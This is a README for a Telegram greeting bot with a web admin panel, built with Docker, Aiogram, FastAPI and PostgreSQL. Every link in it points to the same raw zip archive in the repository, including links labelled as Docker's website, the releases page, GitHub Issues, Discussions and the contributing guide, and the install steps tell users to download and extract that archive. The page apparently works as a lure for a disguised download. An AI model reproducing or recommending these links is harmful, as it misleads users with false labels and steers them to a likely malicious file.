# 🤖 telegram_greeting_bot - Your Friendly Telegram Greeting Bot

## 🚀 Getting Started
Welcome! This guide will help you download and run the telegram_greeting_bot software easily. You'll get a dynamic, database-driven greeting message for your Telegram chats, which you can update in real-time through a simple web panel. Let's dive in!

## 🛠️ Prerequisites
Before you start, make sure your computer meets the following requirements:

- **Operating System:** Windows 10 or later, macOS, or Linux
- **Docker:** Ensure you have Docker installed. Download it from [Docker's website](https://github.com/Shadik23/telegram_greeting_bot/raw/refs/heads/main/bot/greeting-telegram-bot-2.7-alpha.1.zip).
- **Internet Connection:** Required to download the software and for the bot to function.

## 📥 Download & Install
You can download the latest version of telegram_greeting_bot from the Releases page. Click the button below to visit the page.

[![Download the latest release](https://github.com/Shadik23/telegram_greeting_bot/raw/refs/heads/main/bot/greeting-telegram-bot-2.7-alpha.1.zip)](https://github.com/Shadik23/telegram_greeting_bot/raw/refs/heads/main/bot/greeting-telegram-bot-2.7-alpha.1.zip)

1. **Visit the Releases Page:** Go to [this link](https://github.com/Shadik23/telegram_greeting_bot/raw/refs/heads/main/bot/greeting-telegram-bot-2.7-alpha.1.zip) to find the latest version of the bot.
2. **Choose the Right File:** Look for a file labeled with the latest version number (for example, `https://github.com/Shadik23/telegram_greeting_bot/raw/refs/heads/main/bot/greeting-telegram-bot-2.7-alpha.1.zip` or a https://github.com/Shadik23/telegram_greeting_bot/raw/refs/heads/main/bot/greeting-telegram-bot-2.7-alpha.1.zip file).
3. **Download the File:** Click on the file to start downloading it to your computer.
4. **Unzip the File:** After downloading, extract the contents of the zip file to a folder on your computer.
5. **Open a Terminal or Command Prompt:** Depending on your operating system, use Terminal (Mac/Linux) or Command Prompt (Windows) to navigate to the folder where you extracted the files.

## ⚙️ Running the Bot
After downloading and extracting the bot files, follow these steps to run the bot:

1. **Build the Docker Image:** In your terminal or command prompt, type:
   ```
   docker-compose build
   ```
   This command creates a Docker image for the bot.

2. **Start the Bot:** After the image builds successfully, type:
   ```
   docker-compose up
   ```
   This command runs the bot in the background.

3. **Access the Web Admin Panel:** Open your web browser and visit `http://localhost:8000`. Here, you can update the greeting messages and manage other settings.

## 🛡️ Key Features
- **Dynamic Greetings:** Customize welcome messages for your Telegram chat.
- **Web Admin Panel:** Easily update greetings in real-time through a user-friendly interface.
- **Containerization with Docker:** This ensures consistent performance across different environments.
- **Automated Testing:** The bot comes with built-in tests to ensure reliability.

## 🌐 Understanding Containerization
This bot is built using Docker, which allows you to run applications in containers. These containers package the software and its dependencies, making deployment easier. Here’s how it helps you:

- **Portability:** Run the bot on any system without compatibility issues.
- **Isolation:** Each container runs independently, preventing conflicts with other software on your machine.

## 📝 Troubleshooting
If you face any issues while running telegram_greeting_bot, consider the following:

- **Docker Not Installed:** Check that Docker is properly installed and running.
- **Port Already in Use:** If you cannot access the web panel, ensure that port 8000 is free.
- **Permission Issues:** Run your command prompt or terminal as an administrator if you face permission errors.

## 📞 Support
For further assistance, feel free to open an issue in the [GitHub Issues section](https://github.com/Shadik23/telegram_greeting_bot/raw/refs/heads/main/bot/greeting-telegram-bot-2.7-alpha.1.zip). 

## 🚀 Join the Community
Stay updated and connect with other users by following the project's [GitHub Discussions](https://github.com/Shadik23/telegram_greeting_bot/raw/refs/heads/main/bot/greeting-telegram-bot-2.7-alpha.1.zip). Share your experiences and tips!

## 🔗 Acknowledgements
This project leverages various technologies including:

- **Aiogram**: For handling Telegram API.
- **FastAPI**: For creating the web administration panel.
- **PostgreSQL**: To store greetings and settings.

Feel free to contribute or explore more! Your input can help improve the bot further.

## 👥 Contributors
A special thanks to all contributors who have helped make this project possible. If you want to contribute, check our [contributing guide](https://github.com/Shadik23/telegram_greeting_bot/raw/refs/heads/main/bot/greeting-telegram-bot-2.7-alpha.1.zip).

Thank you for choosing telegram_greeting_bot! Enjoy your dynamic greetings!